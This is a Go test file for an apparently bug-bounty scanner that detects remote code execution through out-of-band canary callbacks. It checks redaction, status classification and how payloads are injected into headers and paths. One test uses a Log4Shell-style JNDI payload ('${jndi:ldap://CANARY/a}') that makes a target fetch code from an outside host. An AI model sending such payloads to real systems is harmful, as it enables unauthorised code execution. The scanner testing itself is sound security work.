package engine_test

import (
	"context"
	"encoding/json"
	"errors"
	"io"
	"net"
	"net/http"
	"strings"
	"testing"

	"github.com/bugbountytool/rce-finder/internal/engine"
	"github.com/bugbountytool/rce-finder/internal/oob"
	"github.com/bugbountytool/rce-finder/internal/report"
	"github.com/bugbountytool/rce-finder/internal/template"
)

func TestRequestErrorRedactsCanaryAndQuery(t *testing.T) {
	eng := engine.New(staticOOB{protocol: "dns"}, schedulerOptions())
	eng.SetHTTPClient(&http.Client{Transport: roundTripperFunc(func(*http.Request) (*http.Response, error) {
		return nil, &net.OpError{Op: "dial", Err: errors.New("local test failure")}
	})})
	result := eng.RunTarget(context.Background(), testTarget(), testTemplate())
	data, err := json.Marshal(result)
	if err != nil {
		t.Fatal(err)
	}
	for _, secret := range []string{"canary.test", "q=canary"} {
		if strings.Contains(string(data), secret) {
			t.Fatalf("result leaks %q: %s", secret, data)
		}
	}
	if result.Canary != "" || result.Classification != result.Status {
		t.Fatalf("result was not finalized: %#v", result)
	}
}

// neverCallbackOOB issues canaries but never observes an interaction, so a
// matcher-only response can be shown never to reach CONFIRMED.
type neverCallbackOOB struct{}

func (neverCallbackOOB) Issue(context.Context, string) (string, error) { return "canary.test", nil }
func (neverCallbackOOB) Poll(context.Context, string) (*oob.Interaction, error) {
	return nil, nil
}
func (neverCallbackOOB) Close() error { return nil }

func TestResponseMatchersNeverBecomeConfirmed(t *testing.T) {
	tmpl := testTemplate()
	tmpl.TimeoutSeconds = 1
	tmpl.Matchers = []template.Matcher{{Type: "status", Value: "200"}, {Type: "word", Value: "marker"}}
	eng := engine.New(neverCallbackOOB{}, schedulerOptions())
	eng.SetHTTPClient(&http.Client{Transport: roundTripperFunc(func(*http.Request) (*http.Response, error) {
		return &http.Response{StatusCode: 200, Body: io.NopCloser(strings.NewReader("marker"))}, nil
	})})
	result := eng.RunTarget(context.Background(), testTarget(), tmpl)
	if result.Status != engine.StatusPotential || result.Confidence.Score >= 85 {
		t.Fatalf("single-response result overclaimed: %#v", result)
	}
	var markdown strings.Builder
	if err := report.WriteMarkdown(&markdown, []engine.Result{result}); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(markdown.String(), "POTENTIAL") {
		t.Fatalf("Markdown classification differs: %s", markdown.String())
	}
}

// A response matcher must not pre-empt OOB correlation: when both a matcher
// fires and a correlated callback is observed, the result is CONFIRMED.
func TestMatcherDoesNotPreemptOOBConfirmation(t *testing.T) {
	tmpl := testTemplate()
	tmpl.Matchers = []template.Matcher{{Type: "word", Value: "welcome"}}
	eng := engine.New(staticOOB{protocol: "dns"}, schedulerOptions())
	eng.SetHTTPClient(&http.Client{Transport: roundTripperFunc(func(*http.Request) (*http.Response, error) {
		return &http.Response{StatusCode: 200, Body: io.NopCloser(strings.NewReader("welcome"))}, nil
	})})
	result := eng.RunTarget(context.Background(), testTarget(), tmpl)
	if result.Status != engine.StatusConfirmed {
		t.Fatalf("matcher pre-empted OOB confirmation: %#v", result)
	}
}

// User-Agent declared as an injection point must deliver the payload, not be
// overwritten by the scanner's default UA.
func TestUserAgentInjectionDeliversPayload(t *testing.T) {
	target := testTarget()
	tmpl := &template.Template{ID: "ua", Name: "ua", OOBProtocol: "dns", Method: "GET",
		PayloadTemplate: "{{canary}}",
		InjectionPoints: []template.InjectionPoint{{Location: "header", Name: "User-Agent"}}}
	if err := tmpl.Validate(); err != nil {
		t.Fatalf("validate: %v", err)
	}
	req, err := engine.BuildRequest(context.Background(), target.URL, tmpl, "PAYLOAD-UA", 1024)
	if err != nil {
		t.Fatal(err)
	}
	if got := req.Header.Get("User-Agent"); got != "PAYLOAD-UA" {
		t.Fatalf("User-Agent = %q, want payload", got)
	}
}

// Path-injected payloads must reach the target verbatim, not percent-encoded.
func TestPathInjectionPreservesPayload(t *testing.T) {
	target := testTarget()
	tmpl := &template.Template{ID: "p", Name: "p", OOBProtocol: "dns", Method: "GET",
		PathTemplate:    "v1/{{inject}}",
		PayloadTemplate: "{{canary}}",
		InjectionPoints: []template.InjectionPoint{{Location: "path"}}}
	req, err := engine.BuildRequest(context.Background(), target.URL, tmpl, "${jndi:ldap://CANARY/a}", 1024)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(req.URL.String(), "${jndi:ldap://CANARY/a}") {
		t.Fatalf("path payload was encoded: %s", req.URL.String())
	}
}

func TestCompletedIncludesTerminalAdvisoryResults(t *testing.T) {
	for _, status := range []engine.Status{engine.StatusConfirmed, engine.StatusHighConfidence, engine.StatusPotential, engine.StatusNotVulnerable, engine.StatusSkipped, engine.StatusDryRun} {
		if !engine.Completed(engine.Result{Classification: status}) {
			t.Errorf("terminal %s not marked complete", status)
		}
	}
	for _, status := range []engine.Status{engine.StatusInconclusive, engine.StatusError, engine.StatusBlocked} {
		if engine.Completed(engine.Result{Classification: status}) {
			t.Errorf("retry/review status %s marked complete", status)
		}
	}
}
